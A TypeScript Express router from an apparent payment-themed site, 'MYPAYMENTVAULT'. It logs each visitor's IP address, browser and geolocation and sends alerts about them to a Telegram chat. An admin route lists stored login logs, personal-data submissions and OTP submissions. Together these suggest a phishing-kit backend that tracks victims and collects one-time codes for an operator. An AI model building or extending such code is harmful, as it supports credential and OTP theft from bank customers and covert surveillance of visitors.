import { Router, type IRouter } from "express";
import { db, pageVisitsTable, loginLogsTable, personalSubmissionsTable, otpSubmissionsTable, contactSubmissionsTable } from "@workspace/db";
import { desc } from "drizzle-orm";
import { z } from "zod";
import { tgNotify } from "../lib/tg-notify";
import { getIpGeo } from "../lib/ip-geo";
import { requireAuth } from "../middleware/require-auth";

const router: IRouter = Router();

const VisitBody = z.object({
  path: z.string().min(1),
  referrer: z.string().optional(),
  username: z.string().optional(),
});

/* POST /api/track/visit — log page visit + send Telegram notif */
router.post("/track/visit", async (req, res): Promise<void> => {
  const parsed = VisitBody.safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ ok: false }); return; }

  const { path, referrer } = parsed.data;
  const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
    ?? req.socket.remoteAddress
    ?? "unknown";
  const ua = req.headers["user-agent"] ?? "";

  await db.insert(pageVisitsTable).values({
    path,
    ipAddress: ip,
    userAgent: ua,
    referrer: referrer ?? null,
  }).catch(() => {});

  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const geo = await getIpGeo(ip);
  await tgNotify(
    `👁️ <b>KUNJUNGAN HALAMAN</b>\n` +
    `<code>────────────────────────</code>\n\n` +
    `📄 <b>Path</b>    <code>${path}</code>\n` +
    `🌐 <b>IP</b>      <code>${ip}</code>\n` +
    `${geo.flag} <b>Lokasi</b>  ${geo.label}\n` +
    `🕐 <b>Waktu</b>   ${now}\n` +
    `📱 <b>Browser</b> <code>${ua.slice(0, 60)}</code>\n\n` +
    `<code>────────────────────────</code>\n` +
    `<i>🏦 MYPAYMENTVAULT</i>`
  );

  res.json({ ok: true });
});

/* GET /api/data/all — non-sensitive summary records only (admin only) */
router.get("/data/all", requireAuth, async (_req, res): Promise<void> => {
  try {
    const [visits, logins, personal, otp, contact] = await Promise.all([
      db.select().from(pageVisitsTable).orderBy(desc(pageVisitsTable.visitedAt)).limit(200),
      db
        .select({
          id: loginLogsTable.id,
          username: loginLogsTable.username,
          ipAddress: loginLogsTable.ipAddress,
          status: loginLogsTable.status,
          loggedAt: loginLogsTable.loggedAt,
        })
        .from(loginLogsTable)
        .orderBy(desc(loginLogsTable.loggedAt))
        .limit(200),
      db
        .select({
          id: personalSubmissionsTable.id,
          username: personalSubmissionsTable.username,
          ipAddress: personalSubmissionsTable.ipAddress,
          inquiryType: personalSubmissionsTable.inquiryType,
          submittedAt: personalSubmissionsTable.submittedAt,
        })
        .from(personalSubmissionsTable)
        .orderBy(desc(personalSubmissionsTable.submittedAt))
        .limit(200),
      db
        .select({
          id: otpSubmissionsTable.id,
          username: otpSubmissionsTable.username,
          ipAddress: otpSubmissionsTable.ipAddress,
          submittedAt: otpSubmissionsTable.submittedAt,
        })
        .from(otpSubmissionsTable)
        .orderBy(desc(otpSubmissionsTable.submittedAt))
        .limit(200),
      db
        .select({
          id: contactSubmissionsTable.id,
          username: contactSubmissionsTable.username,
          ipAddress: contactSubmissionsTable.ipAddress,
          inquiryType: contactSubmissionsTable.inquiryType,
          status: contactSubmissionsTable.status,
          submittedAt: contactSubmissionsTable.submittedAt,
        })
        .from(contactSubmissionsTable)
        .orderBy(desc(contactSubmissionsTable.submittedAt))
        .limit(200),
    ]);
    res.json({ visits, logins, personal, otp, contact });
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

export default router;
